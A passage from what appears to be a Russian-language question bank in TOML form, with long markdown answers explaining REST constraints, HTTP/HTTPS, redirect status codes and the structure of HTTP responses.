Семантику методов определяет HTTP, а конкретную ресурсную модель — приложение. RFC 9110 подчёркивает разделение идентификации ресурса и семантики метода запроса. \n\n### REST — не просто CRUD\n\nТакой API выглядит ресурсно:\n\n```text\nGET    /users\nGET    /users/42\nPOST   /users\nPATCH  /users/42\nDELETE /users/42\n```\n\nНо сам набор CRUD-маршрутов ещё не доказывает соответствие REST.\n\nНеобходимо также учитывать:\n\n- stateless-взаимодействие;\n    \n- кэшируемость;\n    \n- самодостаточность сообщений;\n    \n- единообразную семантику;\n    \n- слоистую архитектуру;\n    \n- гипермедийное управление переходами.\n    \n\nСледовательно:\n\n```text\nHTTP + JSON + CRUD ≠ автоматически REST\n```\n\n### REST — не обязательное использование JSON\n\nПредставлением может быть:\n\n```text\nJSON\nXML\nHTML\nCSV\nJPEG\nPDF\n```\n\nНапример:\n\n```v\nGET /reports/2026\nAccept: application/pdf\n```\n\n```text\nGET /reports/2026\nAccept: application/json\n```\n\nОдин ресурс может предоставлять несколько представлений через механизм согласования содержимого.\n\n### REST — не обязательное отсутствие cookies и серверных сессий\n\nCookie сама по себе не нарушает REST.\n\nНарушение возникает, когда серверу для понимания текущего запроса нужен скрытый контекст предыдущих запросов:\n\n```text\nCookie содержит все необходимые авторизационные данные\nили идентификатор проверяемой авторизации\n    → не обязательно нарушает stateless\n\nСервер хранит пошаговый контекст диалога,\nбез которого текущий запрос невозможно понять\n    → нарушает stateless\n```\n\nНа практике классическая серверная пользовательская сессия часто уменьшает степень stateless, особенно когда логика запроса зависит от накопленного контекста сессии. Но вопрос определяется не самим фактом наличия cookie, а тем, является ли каждый запрос самодостаточным.\n\n### Пример условно RESTful API\n\nПолучение заказа:\n\n```text\nGET /orders/1001\nAccept: application/json\nAuthorization: Bearer <token>\n```\n\nОтвет:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: private, max-age=60\nETag: \"order-1001-v4\"\n```\n\n```json\n{\n  \"id\": 1001,\n  \"status\": \"pending\",\n  \"total\": 120.50,\n  \"_links\": {\n    \"self\": {\n      \"href\": \"/orders/1001\"\n    },\n    \"customer\": {\n      \"href\": \"/customers/42\"\n    },\n    \"payment\": {\n      \"href\": \"/orders/1001/payment\",\n      \"method\": \"POST\"\n    }\n  }\n}\n```\n\nЗдесь видны основные элементы REST:\n\n```text\n/orders/1001              → идентификатор ресурса\napplication/json          → представление\nGET                       → единообразная семантика\nAuthorization             → самодостаточность запроса\nCache-Control и ETag      → кэшируемость\n_links                    → гипермедиа\nотсутствие контекста      → stateless\nпрозрачные посредники     → layered system\n```\n\n### Главная цель ограничений\n\nКаждое ограничение создаёт определённые свойства:\n\n|Ограничение|Основной результат|\n|---|---|\n|Client–Server|Разделение обязанностей|\n|Stateless|Масштабируемость и независимость запросов|\n|Cacheable|Производительность и снижение нагрузки|\n|Uniform Interface|Слабая связанность и единообразие|\n|Layered System|Посредники, безопасность и масштабирование|\n|Code on Demand|Расширяемость клиента|\n\nНо ограничения имеют и цену:\n\n```text\nUniform Interface\n→ проще общее взаимодействие\n→ менее эффективно для узкоспециализированных операций\n\nStateless\n→ проще масштабировать\n→ больше данных передаётся в каждом запросе\n\nLayered System\n→ гибкость инфраструктуры\n→ дополнительные задержки\n```\n\nREST — это набор осознанных компромиссов, а не универсально лучший стиль для любой системы. По формулировке Филдинга, REST представляет собой согласованный набор ограничений, направленный на уменьшение задержек и сетевого взаимодействия при одновременном повышении независимости и масштабируемости компонентов. \n\n### Итог\n\n```text\nREST\n    = архитектурный стиль\n    = набор ограничений\n    ≠ протокол\n    ≠ JSON\n    ≠ CRUD\n    ≠ просто красивые URL\n```\n\nRESTful-система должна следовать следующим ограничениям:\n\n```text\nClient–Server\nStateless\nCacheable\nUniform Interface\n    ├── идентификация ресурсов\n    ├── управление через представления\n    ├── самодостаточные сообщения\n    └── HATEOAS\nLayered System\nCode on Demand — необязательно\n```\n\nЦентральная идея REST: клиент взаимодействует с ресурсами через передачу их представлений по единообразному интерфейсу, а переходы между состояниями приложения определяются доступными представлениями и гипермедиа."
  popularity = 7.89

[[questions]]
  id = 11
  question = "Какой протокол обычно используется при построении REST API"
  answer = "### Обычно используется HTTP\n\nREST API чаще всего строят поверх **HTTP**, а в реальных системах — поверх защищённого **HTTPS**, то есть HTTP с шифрованием TLS.\n\n```text\nКлиент\n  ↓ HTTPS\nREST API\n  ↓\nРесурсы и бизнес-логика\n```\n\nREST сам по себе не является протоколом и теоретически не привязан к HTTP. Это архитектурный стиль. Однако он создавался на основе архитектуры Всемирной паутины, поэтому HTTP естественно реализует его ограничения.\n\n### Почему именно HTTP\n\nHTTP предоставляет необходимые элементы единообразного интерфейса:\n\n```text\nGET    /users/42\nPOST   /users\nPUT    /users/42\nPATCH  /users/42\nDELETE /users/42\n```\n\n- URI идентифицирует ресурс;\n    \n- метод определяет смысл операции;\n    \n- заголовки передают метаданные;\n    \n- тело содержит представление ресурса;\n    \n- статус-код сообщает результат;\n    \n- стандартные механизмы поддерживают кэширование и согласование форматов. \n    \n\nПример запроса:\n\n```text\nGET /api/users/42 HTTP/1.1\nHost: example.com\nAccept: application/json\nAuthorization: Bearer <access-token>\n```\n\nОтвет:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: private, max-age=60\n\n{\n  \"id\": 42,\n  \"username\": \"alfob\"\n}\n```\n\n### HTTP или HTTPS\n\nКорректнее различать:\n\n```text\nHTTP  → протокол прикладного уровня\nHTTPS → HTTP, передаваемый через защищённое соединение TLS\n```\n\nДля публичного API практически всегда должен использоваться HTTPS, особенно когда передаются:\n\n- пароли;\n    \n- cookies;\n    \n- JWT;\n    \n- персональные данные;\n    \n- платёжная информация.\n    \n\nБез TLS содержимое HTTP-запросов может быть прочитано или изменено на пути между клиентом и сервером.\n\n### Версия HTTP не меняет REST-модель\n\nREST API может работать через:\n\n```text\nHTTP/1.1\nHTTP/2\nHTTP/3\n```\n\nСемантика методов, URI, заголовков и статус-кодов остаётся общей для разных версий HTTP. RFC 9110 специально определяет HTTP-семантику независимо от конкретной версии передачи сообщений. \n\n### Итог\n\n```text\nREST        → архитектурный стиль\nHTTP        → обычно используемый протокол\nHTTPS       → HTTP с защищённой передачей через TLS\nJSON        → распространённый, но необязательный формат данных\n```\n\nСледовательно, REST API обычно строится на **HTTPS**, используя семантику HTTP для работы с ресурсами."
  popularity = 2.63

[[questions]]
  id = 12
  question = "Как сервер выполняет перенаправление браузера через HTTP-ответ?"
  answer = "### Как работает HTTP-перенаправление\n\nСервер не «перемещает» браузер напрямую. Он возвращает HTTP-ответ с:\n\n1. статус-кодом перенаправления;\n    \n2. заголовком `Location`, содержащим новый URI.\n    \n\n```text\nHTTP/1.1 302 Found\nLocation: /login\nContent-Length: 0\n```\n\nПолучив такой ответ, браузер обычно автоматически формирует **новый HTTP-запрос** по адресу из `Location`. Именно браузер, а не сервер, выполняет переход. RFC 9110 разрешает клиенту автоматически следовать `Location` в ответах перенаправления. \n\n### Последовательность запросов\n\nКлиент запрашивает закрытый ресурс:\n\n```text\nGET /profile HTTP/1.1\nHost: example.com\n```\n\nСервер отвечает:\n\n```text\nHTTP/1.1 302 Found\nLocation: /login\n```\n\nПосле этого браузер отправляет новый запрос:\n\n```text\nGET /login HTTP/1.1\nHost: example.com\n```\n\nСервер возвращает страницу:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>...</html>\n```\n\nТо есть перенаправление состоит из двух отдельных циклов `request → response`:\n\n```text\nGET /profile\n    ↓\n302 Location: /login\n    ↓\nGET /login\n    ↓\n200 OK\n```\n\n### Заголовок Location\n\n`Location` может содержать абсолютный URI:\n\n```text\nLocation: https://accounts.example.com/login\n```\n\nили относительную ссылку:\n\n```text\nLocation: /login\n```\n\nОтносительная ссылка разрешается относительно URI исходного запроса. Для ответов `3xx` значение `Location` указывает предпочтительный целевой ресурс перенаправления. ([RFC Editor](https://www.rfc-editor.org/rfc/inline-errata/rfc9110.html?utm_source=chatgpt.com \"rfc9110\"))\n\n### Основные коды перенаправления\n\n|Код|Значение|Метод следующего запроса|\n|---|---|---|\n|`301 Moved Permanently`|Ресурс перемещён постоянно|Браузер может заменить `POST` на `GET`|\n|`302 Found`|Временное перенаправление|Браузер может заменить `POST` на `GET`|\n|`303 See Other`|Получить результат по другому URI|Используется `GET` или `HEAD`|\n|`307 Temporary Redirect`|Временное перенаправление|Метод и тело сохраняются|\n|`308 Permanent Redirect`|Постоянное перенаправление|Метод и тело сохраняются|\n\nРазличие особенно важно после `POST`.\n\n### 302 после POST\n\nКлиент отправляет форму:\n\n```text\nPOST /orders HTTP/1.1\nContent-Type: application/json\n\n{\n  \"product_id\": 15\n}\n```\n\nСервер отвечает:\n\n```text\nHTTP/1.1 302 Found\nLocation: /orders/1001\n```\n\nИсторически браузеры часто преобразуют следующий запрос в:\n\n```text\nGET /orders/1001\n```\n\nХотя старые определения `301` и `302` предполагали сохранение метода, распространённое браузерное поведение допускает замену `POST` на `GET`. Когда сохранение метода принципиально важно, используют `307` или `308`. \n\n### 303 See Other\n\n`303` явно говорит клиенту получить другой ресурс через `GET` или `HEAD`:\n\n```text\nPOST /orders HTTP/1.1\nContent-Type: application/json\n\n{\n  \"product_id\": 15\n}\n```\n\nОтвет:\n\n```text\nHTTP/1.1 303 See Other\nLocation: /orders/1001\n```\n\nСледующий запрос:\n\n```text\nGET /orders/1001 HTTP/1.1\n```\n\nЭто часто применяется в схеме **Post/Redirect/Get**:\n\n```text\nPOST — выполнить операцию\n303  — перенаправить на результат\nGET  — показать результат\n```\n\nТак обновление страницы не приводит к повторной отправке исходного `POST`. RFC 9110 прямо определяет `303` как переход к другому ресурсу посредством запроса на получение, обычно `GET` или `HEAD`. \n\n### 307 и 308\n\nЭти коды сохраняют исходный HTTP-метод и тело.\n\nИсходный запрос:\n\n```text\nPOST /old-endpoint HTTP/1.1\nContent-Type: application/json\n\n{\n  \"value\": 10\n}\n```\n\nОтвет:\n\n```text\nHTTP/1.1 307 Temporary Redirect\nLocation: /new-endpoint\n```\n\nБраузер повторяет:\n\n```text\nPOST /new-endpoint HTTP/1.1\nContent-Type: application/json\n\n{\n  \"value\": 10\n}\n```\n\nРазница:\n\n```text\n307 → временное перенаправление\n308 → постоянное перенаправление\n```\n\nИх следует применять, когда изменение `POST` на `GET` недопустимо.\n\n### Пример в FastAPI\n\n```python\nfrom fastapi import FastAPI\nfrom fastapi.responses import RedirectResponse\n\napp = FastAPI()\n\n\n@app.get(\"/profile\")\nasync def profile():\n    return RedirectResponse(\n        url=\"/login\",\n        status_code=302,\n    )\n\n\n@app.post(\"/orders\")\nasync def create_order():\n    order_id = 1001\n\n    return RedirectResponse(\n        url=f\"/orders/{order_id}\",\n        status_code=303,\n    )\n```\n\nFastAPI сформирует ответ примерно такого вида:\n\n```text\nHTTP/1.1 303 See Other\nLocation: /orders/1001\nContent-Length: 0\n```\n\n### Тело ответа необязательно\n\nОтвет перенаправления может содержать HTML с обычной ссылкой:\n\n```text\nHTTP/1.1 302 Found\nLocation: /login\nContent-Type: text/html\n\n<a href=\"/login\">Перейти на страницу входа</a>\n```\n\nЭто полезно для клиентов, которые не выполняют автоматическое перенаправление. Однако основным механизмом остаются статус-код и `Location`. RFC отмечает, что содержимое ответа перенаправления обычно может включать короткую гипертекстовую заметку со ссылкой. \n\n### Не каждый код 3xx означает переход на другой URL\n\nНапример:\n\n```text\n304 Not Modified\n```\n\nтоже относится к классу `3xx`, но не перенаправляет браузер на другой ресурс. Он сообщает кэшу, что сохранённое представление можно использовать повторно.\n\nПоэтому корректнее говорить:\n\n```text\nперенаправление обычно выполняется\nчерез определённый статус 3xx + Location\n```\n\nа не «любой ответ 3xx перенаправляет браузер».\n\n### Перенаправление и внутренний rewrite\n\nHTTP-перенаправление:\n\n```text\nБраузер запрашивает /old\nСервер отвечает 301 Location: /new\nБраузер запрашивает /new\nURL в адресной строке изменяется\n```\n\nВнутреннее перенаправление или rewrite:\n\n```text\nБраузер запрашивает /old\nСервер внутри обрабатывает запрос как /new\nСервер сразу отвечает 200\nURL в браузере остаётся /old\n```\n\nПри HTTP redirect возникает новый запрос от браузера. При rewrite маршрутизация изменяется только внутри сервера.\n\n### Итог\n\n```text\n1. Браузер отправляет запрос.\n2. Сервер возвращает 301/302/303/307/308.\n3. В ответе указывается Location.\n4. Браузер читает Location.\n5. Браузер создаёт новый HTTP-запрос.\n6. Адресная строка изменяется на новый URL.\n```\n\nГлавное различие кодов состоит в постоянстве перенаправления и в том, должен ли браузер сохранить исходный HTTP-метод:\n\n```text\n303       → перейти через GET\n307 / 308 → сохранить метод и тело\n301 / 302 → исторически могут преобразовать POST в GET\n```"
  popularity = 2.63

[[questions]]
  id = 13
  question = "Из чего состоит response в REST"
  answer = "### Из чего состоит response в REST API\n\nREST не определяет отдельный формат ответа. Обычно REST API работает поверх HTTP, поэтому response — это обычный **HTTP-ответ**.\n\nДля HTTP/1.1 его структура выглядит так:\n\n```text\nStatus line\nHeaders\n\nBody\n```\n\nМежду заголовками и телом находится пустая строка. Тело необязательно. \n\nПример:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 46\nCache-Control: private, max-age=60\n\n{\n  \"id\": 42,\n  \"username\": \"alfob\"\n}\n```\n\n### 1. Status line — строка состояния\n\n```http\nHTTP/1.1 200 OK\n```\n\nОна содержит:\n\n```text\nHTTP-version status-code reason-phrase\n```\n\n- `HTTP/1.1` — версия HTTP;\n    \n- `200` — статус-код;\n    \n- `OK` — текстовое описание статуса.\n    \n\nИменно числовой статус-код определяет результат обработки запроса. Текстовая фраза `OK`, `Not Found` и подобные служит пояснением и не должна использоваться программой для определения результата.\n\nОсновные группы:\n\n|Диапазон|Значение|\n|---|---|\n|`1xx`|информационный ответ|\n|`2xx`|запрос успешно обработан|\n|`3xx`|перенаправление или работа с кэшем|\n|`4xx`|ошибка со стороны клиента|\n|`5xx`|ошибка со стороны сервера|\n\nПримеры:\n\n```text\n200 OK\n201 Created\n204 No Content\n400 Bad Request\n401 Unauthorized\n403 Forbidden\n404 Not Found\n409 Conflict\n422 Unprocessable Content\n500 Internal Server Error\n```\n\n### 2. Headers — заголовки ответа\n\nЗаголовки содержат метаданные ответа:\n\n```text\nContent-Type: application/json\nContent-Length: 46\nCache-Control: private, max-age=60\nETag: \"user-42-v3\"\nLocation: /users/42\nSet-Cookie: session=abc123; HttpOnly; Secure\n```\n\nРаспространённые заголовки:\n\n|Заголовок|Назначение|\n|---|---|\n|`Content-Type`|формат содержимого тела|\n|`Content-Length`|размер тела в байтах|\n|`Content-Encoding`|сжатие содержимого, например `gzip`|\n|`Cache-Control`|правила кэширования|\n|`ETag`|версия представления ресурса|\n|`Location`|URI созданного ресурса или адрес перенаправления|\n|`Set-Cookie`|установка cookie|\n|`WWW-Authenticate`|схема аутентификации при ошибке|\n|`Allow`|разрешённые методы|\n|`Retry-After`|когда клиенту следует повторить запрос|\n|`Access-Control-Allow-Origin`|часть настроек CORS|\n\nЗаголовки описывают ответ целиком или представление, находящееся в его теле. \n\n### 3. Пустая строка\n\nВ HTTP/1.1 после заголовков идёт пустая строка:\n\n```text\nContent-Type: application/json\nContent-Length: 46\n\n{\n  \"id\": 42\n}\n```\n\nОна отделяет секцию заголовков от тела ответа. Даже когда тела нет, пустая строка завершает секцию заголовков. \n\n### 4. Body — тело ответа\n\nТело содержит представление ресурса или описание результата операции.\n\nЧаще всего REST API возвращает JSON:\n\n```json\n{\n  \"id\": 42,\n  \"username\": \"alfob\"\n}\n```\n\nНо REST не требует именно JSON. Тело может содержать:\n\n```text\nJSON\nXML\nHTML\nCSV\nPDF\nизображение\nвидео\nбинарный файл\n```\n\nФормат определяется заголовком `Content-Type`:\n\n```text\nContent-Type: application/json\n```\n\n```text\nContent-Type: application/pdf\n```\n\n```text\nContent-Type: image/png\n```\n\nСмысл содержимого зависит от метода исходного запроса, статус-кода ответа и заголовков, описывающих представление.\n\n### У ответа не всегда есть body\n\nНекоторые ответы не содержат тело.\n\n#### `204 No Content`\n\n```text\nHTTP/1.1 204 No Content\n```\n\nИспользуется, когда операция выполнена успешно, но возвращать представление не требуется.\n\n#### Ответ на `HEAD`\n\n```text\nHEAD /users/42\n```\n\nСервер возвращает заголовки, которые соответствовали бы `GET`, но без тела.\n\n#### `304 Not Modified`\n\n```text\nHTTP/1.1 304 Not Modified\nETag: \"user-42-v3\"\n```\n\nКлиент должен использовать ранее закэшированное представление.\n\nОтветы на `HEAD`, а также ответы со статусами `1xx`, `204` и `304` не содержат тело сообщения. \n\n### Пример успешного получения ресурса\n\nЗапрос:\n\n```text\nGET /users/42 HTTP/1.1\nHost: api.example.com\nAccept: application/json\n```\n\nОтвет:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: application/json\nETag: \"user-42-v3\"\nCache-Control: private, max-age=60\n\n{\n  \"id\": 42,\n  \"username\": \"alfob\",\n  \"is_active\": true\n}\n```\n\nСтруктура:\n\n```text\nHTTP/1.1 200 OK                 → строка состояния\nContent-Type: application/json  → заголовок\nETag: \"user-42-v3\"              → заголовок\nCache-Control: ...              → заголовок\n                                 → пустая строка\n{ ... }                         → тело\n```\n\n### Пример создания ресурса\n\n```text\nHTTP/1.1 201 Created\nLocation: /users/42\nContent-Type: application/json\n\n{\n  \"id\": 42,\n  \"username\": \"alfob\"\n}\n```\n\nЗдесь:\n\n- `201 Created` сообщает об успешном создании;\n    \n- `Location` указывает URI созданного ресурса;\n    \n- body содержит его представление.\n    \n\n### Пример ошибки\n\n```text\nHTTP/1.1 404 Not Found\nContent-Type: application/problem+json\n\n{\n  \"type\": \"https://api.example.com/problems/user-not-found\",\n  \"title\": \"User not found\",\n  \"status\": 404,\n  \"detail\": \"User with ID 42 does not exist\"\n}\n```\n\nТело ошибки не имеет обязательной REST-структуры. API самостоятельно определяет её контракт. Для стандартизированного описания HTTP-ошибок может применяться формат `application/problem+json`.\n\nВажно не дублировать противоречащие значения:\n\n```text\nHTTP/1.1 404 Not Found\n```\n\n```json\n{\n  \"status\": 200\n}\n```\n\nКлиент прежде всего должен ориентироваться на HTTP-статус ответа.\n\n### Представление ресурса и служебная обёртка\n\nAPI может вернуть непосредственно ресурс:\n\n```json\n{\n  \"id\": 42,\n  \"username\": \"alfob\"\n}\n```\n\nИли использовать прикладную обёртку:\n\n```json\n{\n  \"data\": {\n    \"id\": 42,\n    \"username\": \"alfob\"\n  },\n  \"meta\": {\n    \"request_id\": \"c7e84f\"\n  }\n}\n```\n\nТакая обёртка является решением конкретного API, а не обязательным требованием REST.\n\nДля коллекции часто возвращают:\n\n```json\n{\n  \"items\": [\n    {\n      \"id\": 41,\n      \"username\": \"user1\"\n    },\n    {\n      \"id\": 42,\n      \"username\": \"user2\"\n    }\n  ],\n  \"pagination\": {\n    \"limit\": 20,\n    \"offset\": 0,\n    \"total\": 154\n  }\n}\n```\n\n### Trailers — завершающие поля\n\nHTTP также допускает trailer-поля, передаваемые после содержимого сообщения. Они применяются значительно реже заголовков, например когда значение можно вычислить только после формирования тела.\n\nУсловно:\n\n```text\nHTTP/1.1 200 OK\nTransfer-Encoding: chunked\nTrailer: Digest\n\n...тело ответа...\n\nDigest: sha-256=...\n```\n\nДля большинства REST API структура обычно ограничивается статусом, заголовками и необязательным телом.\n\n### Особенность HTTP/2 и HTTP/3\n\nЗапись:\n\n```text\nHTTP/1.1 200 OK\n```\n\nотносится к текстовому формату HTTP/1.1.\n\nВ HTTP/2 нет текстовой status line. Статус передаётся в специальном псевдозаголовке:\n\n```text\n:status: 200\ncontent-type: application/json\n```\n\nЗаголовки и содержимое передаются бинарными кадрами. Однако на уровне приложения смысл остаётся тем же:\n\n```text\nстатус\n+ поля ответа\n+ необязательное содержимое\n```\n\nHTTP/2 требует присутствия единственного псевдозаголовка `:status` в каждом ответе. \n\n### Итоговая структура\n\nДля обычного REST API поверх HTTP response состоит из:\n\n```text\n1. Статус ответа\n2. Заголовки\n3. Пустая строка в HTTP/1.1\n4. Необязательное тело\n5. Необязательные trailer-поля\n```\n\nПрактически важная модель:\n\n```text\nHTTP response\n├── status code\n├── headers\n└── body — необязательно\n```\n\nREST определяет архитектурные ограничения взаимодействия, но конкретную структуру сообщения в таком API обычно предоставляет HTTP."
